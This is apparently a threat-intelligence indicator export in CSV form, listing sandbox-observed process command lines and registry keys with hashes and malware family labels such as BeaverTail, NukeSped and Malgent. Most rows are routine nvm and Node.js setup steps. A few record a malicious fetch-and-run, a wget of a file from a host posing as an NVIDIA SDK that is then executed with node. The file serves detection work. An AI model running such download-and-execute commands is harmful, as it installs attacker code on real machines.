"Indicator_Type","Unique_Item","File_Hash","Malware_Family","Meaningful_Name","Last_Observation_Date"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\script.js""","db640a3823667682c6b2ea580ee158de96e198224b37db2bf9faacb3c39cf06f","Trojan:Win32/Alevaul!rfn","app.js","2025-09-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\script.js""","72ebfe69c69d2dd173bb92013ab44d895a3367f91f09e3f8d18acab44e37b26d","Trojan:JS/Obfuse!MSR","african-economy-main/src/store/actions/act.js","2025-10-16"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\searchFeatures.js""","c2ea2ed2ba9cba62e900ed1914ef54a9d659870d3cf0c8ac79348ee7b80badf4","TrojanDropper:JS/BeaverTail.B!dha","C:\Users\user\AppData\Local\Temp\sgeucjpt.spx\FreeBlingDash\src\utils\searchFeatures.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\tailwind.config.js""","0bf43170dd9f66905e7a335de35e06d2e34a5842200b59f18518688f4f60c3f8","Trojan:JS/BeaverTail","gdpcoin-portal-main/client/tailwind.config.js","2024-11-08"
"Process","C:\Windows\System32\wscript.exe C:\Windows\System32\WScript.exe ""C:\Users\user\Desktop\userRoutes.js""","113bf022d6d028b2745b46593fbec932ee24f04bc22deab117f5379a3674cc26","Trojan:JS/NukeSped.HNAA!MTB","express-react/backend/routes/userRoutes.js","2024-11-08"
"Process","C:\Windows\SysWOW64\7za.exe ""C:\Windows\System32\7za.exe"" x -pinfected -y -o""C:\Users\user\AppData\Local\Temp\4axnrbst.fdy"" ""C:\Users\user\Desktop\ebenra.zip""","92837283a26f56a8de586897a7cb9481acc45426c2488e22184680ea04f25895","Unknown","ebenra.zip","2024-12-06"
"Process","C:\Windows\SysWOW64\7za.exe ""C:\Windows\System32\7za.exe"" x -pinfected -y -o""C:\Users\user\AppData\Local\Temp\divxqrwm.ue1"" ""C:\Users\user\Desktop\sample.zip""","0a49f0a8d0b1e856b7d109229dfee79212c10881dcc4011b98fe69fc28100182","Unknown","VCam_ARM64.zip","2025-07-22"
"Process","C:\Windows\SysWOW64\7za.exe ""C:\Windows\System32\7za.exe"" x -pinfected -y -o""C:\Users\user\AppData\Local\Temp\uph4fabj.ujf"" ""C:\Users\user\Desktop\twm-marketplace-v1-main.zip""","62ccfa88d3961c78e357cc938c254eee056253aa983a4def2b5412baa8817c46","Unknown","twm-marketplace-v1-main.zip","2024-11-08"
"Process","C:\Windows\SysWOW64\7za.exe C:\Windows\System32\7za.exe"" x -pinfected -y -o""C:\Users\user\AppData\Local\Temp\bbmg5cmr.hjl"" ""C:\Users\user\Desktop\FreeBlingDash.zip","8dd6cbb69e0f9e588a4e8f0be76693f90bbc80142d7034427a17175b387e5373","Unknown","FreeBlingDash.zip","2024-11-08"
"Process","C:\Windows\SysWOW64\7za.exe C:\Windows\System32\7za.exe"" x -pinfected -y -o""C:\Users\user\AppData\Local\Temp\sgeucjpt.spx"" ""C:\Users\user\Desktop\FreeBlingDash.zip","8dd6cbb69e0f9e588a4e8f0be76693f90bbc80142d7034427a17175b387e5373","Unknown","FreeBlingDash.zip","2024-11-08"
"Process","C:\Windows\SysWOW64\msiexec.exe C:\Windows\syswow64\MsiExec.exe -Embedding 787D2895109236159C5DE9CBD57513A6 C","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\SysWOW64\msiexec.exe C:\Windows\syswow64\MsiExec.exe -Embedding FBFB637C921E63A9EDDCF52B30804711","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\syswow64\MsiExec.exe -Embedding B479AC72D2513B8934E453E415499C02","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Process","C:\Windows\SysWOW64\unarchiver.exe"" ""C:\Users\user\Desktop\FreeBlingDash.zip","8dd6cbb69e0f9e588a4e8f0be76693f90bbc80142d7034427a17175b387e5373","Unknown","FreeBlingDash.zip","2024-11-08"
"Process","curl -q --fail --compressed -L -C - --progress-bar https://nodejs.org/dist/v20.19.0/node-v20.19.0-linux-x64.tar.xz -o /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/node-v20.19.0-linux-x64.tar.xz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","curl -q --fail --compressed -L -s https://iojs.org/dist/index.tab -o -","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","curl -q --fail --compressed -L -s https://nodejs.org/dist/index.tab -o -","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","curl -q --fail --compressed -L -s https://nodejs.org/dist/v20.19.0/SHASUMS256.txt -o -","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","curl -V","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/node-v20.19.0-linux-x64.tar.xz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/nvm.sh","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/versions","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/versions/node","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/versions/node/v20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/versions/node/v20.19.0/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /root/.nvm/versions/node/v20.19.0/bin/node","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /usr","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /usr/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","dirname /usr/bin/node","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","getconf LONG_BIT","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git -c advice.detachedHead=false --git-dir=/root/.nvm/.git --work-tree=/root/.nvm checkout -f --quiet FETCH_HEAD","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git clone https://github.com/nvm-sh/nvm.git --depth=1 /root/.nvm","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --git-dir=/root/.nvm/.git --work-tree=/root/.nvm fetch origin tag v0.40.2 --depth=1","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --git-dir=/root/.nvm/.git --work-tree=/root/.nvm gc --auto --aggressive --prune=now","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --git-dir=/root/.nvm/.git --work-tree=/root/.nvm reflog expire --expire=now --all","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --git-dir=/root/.nvm/.git --work-tree=/root/.nvm show-ref refs/heads/master","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --no-pager --git-dir=/root/.nvm/.git --work-tree=/root/.nvm branch --quiet","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","git --no-pager --git-dir=/root/.nvm/.git --work-tree=/root/.nvm branch --quiet -D master","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep ^Features:","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep 404 Not Found /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/node-v20.19.0-linux-x64.tar.xz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -Eq (^|:)(/usr(/local)?)?/bin:.*/root/.nvm/[^/]*/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -Eq (^|:)(/usr(/local)?)?/bin:.*/root/.nvm/versions/[^/]*/[^/]*/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -Eq (^|:)(/usr(/local)?)?/share/man:.*/root/.nvm/[^/]*/share/man","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -Eq (^|:)(/usr(/local)?)?/share/man:.*/root/.nvm/versions/[^/]*/[^/]*/share/man","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q #","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q /root/.nvm/[^/]*/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q /root/.nvm/[^/]*/share/man","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q /root/.nvm/versions/[^/]*/[^/]*/bin","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q /root/.nvm/versions/[^/]*/[^/]*/share/man","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -q libz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -qc $NVM_DIR/bash_completion /root/.bashrc","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -qc /nvm.sh /root/.bashrc","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -v N/A","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","grep -w v20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","head -n 1","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","ls -A /root/.nvm","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","manpath","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","mkdir -p /root/.nvm","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","mkdir -p /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","mkdir -p /root/.nvm/alias/lts","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","mkdir -p /root/.nvm/versions/node/v20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","mv /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/bin /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/CHANGELOG.md /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/include /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/lib /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/LICENSE /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/README.md /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files/share /root/.nvm/versions/node/v20.19.0","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","node /root/.linvidia","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","node /root/.nvm/versions/node/v20.19.0/bin/npm --version","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","node --version","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","rm -rf /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed 
        1d;
        s/^//;","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed 
        1d;
        s/^/iojs-/;","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed /^ *$/d","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed -e s#/root/.nvm/[^/]*/bin[^:]*#/root/.nvm/versions/node/v20.19.0/bin# -e s#/root/.nvm/versions/[^/]*/[^/]*/bin[^:]*#/root/.nvm/versions/node/v20.19.0/bin#","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed -e s#/root/.nvm/[^/]*/share/man[^:]*#/root/.nvm/versions/node/v20.19.0/share/man# -e s#/root/.nvm/versions/[^/]*/[^/]*/share/man[^:]*#/root/.nvm/versions/node/v20.19.0/share/man#","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed -e s/[^\.]//g","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed -e s/^\([0-9]\)/v\1/g","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed s/ *$//g","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed s/-.*$//g","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sed s:^/root:$HOME:","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sha256sum /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/node-v20.19.0-linux-x64.tar.xz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sort","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","sort -t. -u -k 1.2,1n -k 2,2n -k 3,3n","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tail -1","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tail -n 1","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tar -xJf /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/node-v20.19.0-linux-x64.tar.xz -C /root/.nvm/.cache/bin/node-v20.19.0-linux-x64/files --strip-components 1","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/default","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/*","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/argon","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/boron","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/carbon","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/dubnium","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/erbium","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/fermium","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/gallium","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/hydrogen","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/iron","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tee /root/.nvm/alias/lts/jod","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tput -T xterm colors","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tr [:upper:] [:lower:]","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tr 0; 1;","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","tr t \t","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","uname","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","uname -a","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","uname -m","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","wget --no-check-certificate --user-agent=209 -O /root/.linvidia https://nvidiasdk.fly.dev/nvs","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.2/install.sh","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","which node","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","which xz","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","xterm -hold -e /bin/bash /tmp/install.sh","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Process","xz -d","e224a1db42ae2164d6b2f2a7f1f0e02056e099fc8d669ce37cdaa0a2a2750e3b","Unknown","downlin.sh","2025-09-22"
"Registry Key","\REGISTRY\A\{E53FC79C-4551-EFB4-4A07-214F49E7E98A}\Root\InventoryApplication\0000021f1df94e2c7570a94e39009b97cde300000000\Publisher = Microsoft Corporation","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Registry Key","\REGISTRY\A\{E53FC79C-4551-EFB4-4A07-214F49E7E98A}\Root\InventoryApplication\0000c34c48b48a14753d8877e705591744db00000000\Publisher = Microsoft Corporation","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Registry Key","\REGISTRY\A\{E53FC79C-4551-EFB4-4A07-214F49E7E98A}\Root\InventoryApplication\0000ca0169d7b9bbcfa4e65eb68a13f930210000ffff\Publisher = Mozilla","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
"Registry Key","\REGISTRY\A\{E53FC79C-4551-EFB4-4A07-214F49E7E98A}\Root\InventoryApplicationFile\addinprocess.exe|313edc2dd92685a6\BinProductVersion = 4.0.30319.0","36cac29ff3c503c2123514ea903836d5ad81067508a8e16f7947e3e675a08670","Trojan:Win64/Malgent!MSR","FCCCall.msi","2025-01-22"
